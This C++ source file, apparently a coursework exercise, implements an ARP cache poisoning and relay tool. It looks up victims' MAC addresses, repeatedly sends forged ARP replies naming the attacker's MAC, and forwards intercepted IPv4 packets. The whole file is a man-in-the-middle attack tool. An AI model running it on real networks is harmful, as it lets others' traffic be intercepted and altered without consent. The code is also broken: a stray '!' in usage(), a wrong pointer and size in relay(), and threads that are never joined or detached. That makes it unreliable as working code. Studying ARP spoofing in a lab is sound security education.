#include <bits/stdc++.h>

#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <pcap.h>
#include <cstdint>

#include <thread>
#include <unistd.h>

#define N_ITER 1000
#define N_MAX_ARGS 20

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final
{
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage()
{
	!
}

Mac attacker_mac;
Ip attacker_ip;

Mac sender_macs[N_MAX_ARGS];
Mac target_macs[N_MAX_ARGS];
Ip sender_ips[N_MAX_ARGS];
Ip target_ips[N_MAX_ARGS];

int n_args;

pcap_t *handle;

void set_attacker(char *interface)
{
	// find my mac address, and set it to attacker_mac
	// find my IP address. set it to attacker IP.
	// code referenced from https://stackoverflow.com/a/1779800 & https://technote.kr/176

	struct ifreq s;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	strcpy(s.ifr_name, interface);

	char ipstr[40];

	if (0 == ioctl(fd, SIOCGIFHWADDR, &s))
	{
		Mac tmp((uint8_t *)s.ifr_addr.sa_data); // ok, so pointer hack does the trick... but... nasty...
		//D cout << (string)tmp << endl; debug code.
		inet_ntop(AF_INET, s.ifr_addr.sa_data + 2, ipstr, sizeof(struct sockaddr));

		attacker_mac = tmp;
		attacker_ip = Ip((string)ipstr); // again.. nasty pointer hack...
	}
	cout << "My Mac address :: " << (string)attacker_mac << '\n';
	cout << "My IP address :: (reversed)" << (string)attacker_ip << '\n';
}

int send_arp(Mac eth_dmac, Mac eth_smac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip, uint16_t op)
{
	// pretty much from gilgil codebase.

	EthArpPacket packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.arp_.smac_ = arp_smac;
	packet.arp_.sip_ = htonl(arp_sip);
	packet.arp_.tmac_ = arp_tmac;
	packet.arp_.tip_ = htonl(arp_tip);

	packet.arp_.op_ = htons(op);

	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
	if (res != 0 || (op != ArpHdr::Request && op != ArpHdr::Reply))
	{ // op must be request or reply.
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return -1;
	}
	return 0;
}

void background_send_arp(int idx)
{
	while (1)
	{
		int res = send_arp(
			sender_macs[idx],
			attacker_mac,
			attacker_mac,
			target_ips[idx],
			sender_macs[idx],
			sender_ips[idx],
			ArpHdr::Reply);
		if (res == -1)
		{
			cout << "Something broke in Pipe at " << idx << " th background poison-arp \n";
		}

		cout << "Send Arp " << res << " " << idx << "th background send arp \n";

		sleep(3);
	}
}

Mac from_ip(Ip _ip)
{
	// use attacker's mac, ip address + arp request packet to get mac address of target from target's ip address.

	// first send arp
	Mac _dmac((string) "ff:ff:ff:ff:ff:ff");
	Mac _arp_tmac((string) "00:00:00:00:00:00");
	const pcap_pkthdr *header;
	const u_char *pkt_data;

	int sends = send_arp(_dmac, attacker_mac, attacker_mac, attacker_ip, _arp_tmac, _ip, ArpHdr::Request);
	int cnt = 0;
	while (cnt < N_ITER)
	{
		cnt += 1;
		struct pcap_pkthdr *header;
		const u_char *packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0)
			continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthHdr *_current_eth = (struct EthHdr *)(packet);
		ArpHdr *_current_arp = (struct ArpHdr *)(packet + 14);

		//if (_current_eth->type_ != htons(EthHdr::Arp)) continue;
		cout << (string)_current_arp->sip_ << '\n'
			 << (string)(Ip)htonl(_ip) << '\n';
		if (_current_arp->sip_ != htonl(_ip))
			continue;
		cout << "Found The Mac from IP " << (string)_ip << " : \n " << (string)_current_arp->smac_ << endl;
		return _current_eth->smac_;
	}
	cout << "iterated over " << N_ITER << "but no hope" << endl;
	return Mac((string) "00:00:00:00:00:00");
}

int relay(EthArpPacket *context_packet, int idx)
{
	context_packet->eth_.smac_ = attacker_mac;
	context_packet->eth_.dmac_ = target_macs[idx];

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&context_packet), sizeof(EthArpPacket));
	if (res != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return -1;
	}
	return 0;
}

int main(int argc, char *argv[])
{
	n_args = (argc - 1) / 2;

	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// set my (attacker) mac addr, ip addr.
	set_attacker(dev);

	for (int i = 2; i < argc; i += 2)
	{
		int idx = i / 2 - 1;
		Ip sender_ip(argv[i]);
		Ip target_ip(argv[i + 1]);

		sender_ips[idx] = sender_ip;
		target_ips[idx] = target_ip;

		cout << "Retreiving Mac from Victom's Ip \n";

		sender_macs[idx] = from_ip(sender_ip);
		target_macs[idx] = from_ip(target_ip);
	}

	for (int i = 0; i < n_args; i++)
	{
		thread(background_send_arp, i);
	}

	while (1)
	{
		struct pcap_pkthdr *header;
		const u_char *packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0)
			continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		EthHdr *_current_eth = (struct EthHdr *)(packet);
		EthArpPacket *_current_packet = (struct EthArpPacket *)(packet);

		// It must be both Ipv4, and NOT broadcast, and NOT destinated to
		// me
		if ((*_current_eth).type() == EthHdr::Ip4)
		{ // Is ipv4
			Ip *this_sip = (struct Ip *)(packet + sizeof(EthHdr) + 12);
			Ip *this_dip = (struct Ip *)(packet + sizeof(EthHdr) + 16);
			
			Mac this_dmac = _current_eth->dmac_;
			if (ntohl(*this_dip) == attacker_ip || _current_eth->dmac_.isBroadcast())
				continue;
			// must be not destined to me
			// & must be not broadcast
			else
			{
				cout << "Found Valid IPv4 Packet : " << endl;
				for (int i = 0; i < n_args; i++)
				{
					if (sender_ips[i] == *this_sip && this_dmac == attacker_mac)
					{
						
						//   S -> T
						//   | /
						//   A <- recieved packet. 
						//  
						cout << "Found matching arg pair in list. Relay." << endl;
						int x = relay(_current_packet, i);
						if(x == 0){
							cout << "Relay Succesful" << '\n';
						}
					}
				}
			}
		}
		else if ((*_current_eth).type() == EthHdr::Arp)
		{
			cout << "Found Arp Packet : " << endl;
			ArpHdr *_current_arp = (struct ArpHdr *)(packet + 14);
			Mac this_sender_mac = _current_arp->smac_;

			for (int i = 0; i < n_args; i++)
			{
				if (sender_macs[i] == this_sender_mac && _current_arp->tmac_ == attacker_mac)
				{
					cout << "Found matching arg pair in list. Repoison." << endl;
					int res = send_arp(
						sender_macs[i],
						attacker_mac,
						attacker_mac,
						target_ips[i],
						sender_macs[i],
						sender_ips[i],
						ArpHdr::Reply);
					if(res == -1){
						cout << "Error in Repoisoning" << endl;
					}
				}
			}
		}
	}

	pcap_close(handle);
}
